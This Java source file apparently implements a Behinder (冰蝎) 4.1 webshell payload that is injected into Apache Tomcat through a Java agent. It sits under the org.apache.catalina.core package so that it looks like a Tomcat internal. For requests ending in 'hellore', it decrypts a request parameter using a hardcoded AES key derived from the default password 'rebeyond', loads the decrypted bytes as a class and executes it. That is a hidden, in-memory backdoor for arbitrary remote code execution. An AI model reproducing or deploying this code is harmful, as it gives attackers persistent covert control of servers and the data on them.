package org.apache.catalina.core;

import javax.crypto.BadPaddingException;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import sun.misc.Unsafe;
import sun.misc.BASE64Decoder;

import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.util.HashMap;

import javax.servlet.http.HttpSession;
import javax.xml.ws.Response;

import org.omg.CORBA.Request;

//这里，我也想使用原始的办法进行加载，但agent注入是不允许产生新类和新函数的。
//所以还是被迫在多个环境中进行类加载
public class RebeyondServices {

    //冰蝎里有个自定义的类加载器（自定义类在agent中调用不到），这里使用反射的方法
    //传进来就变成RequestFacade 所以必要操作在函数外做掉
    //这里用的是4.1 冰蝎
    public static void doServices(java.util.Map rdd,Object obj)
            throws NoSuchPaddingException, NoSuchAlgorithmException, InvalidKeyException, IllegalBlockSizeException, BadPaddingException, IOException, InstantiationException, IllegalAccessException, NoSuchFieldException, InvocationTargetException, NoSuchMethodException, ClassNotFoundException {
        if(((String)rdd.get("url")).matches("/(.*)hellore")) { //
            String k="e45e329feb5d925b";/*该密钥为连接密码32位md5值的前16位，‌默认连接密码rebeyond*/ //
            //((HttpSession)((HashMap)obj).get("session")).putValue("u",k); //
            javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES"); //
            c.init(2,new javax.crypto.spec.SecretKeySpec(k.getBytes(),"AES")); //
            byte[] data = new sun.misc.BASE64Decoder().decodeBuffer((String) rdd.get("b")); //
            //for(int i=0;i<data.length;i++){data[i]^=k.charAt(0);} //
            byte[] dc=c.doFinal(data);
            //Method method = Class.forName("java.lang.ClassLoader").getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            //method.setAccessible(true);
            //Class clazz = (Class) method.invoke(rdd.getClass().getClassLoader(), dc,0, dc.length);
            Class clazz = org.apache.catalina.core.utils.Util.extendClassLoader(c.doFinal(data));
            System.out.println(clazz);
            clazz.newInstance().equals(obj);
        }
    }

}
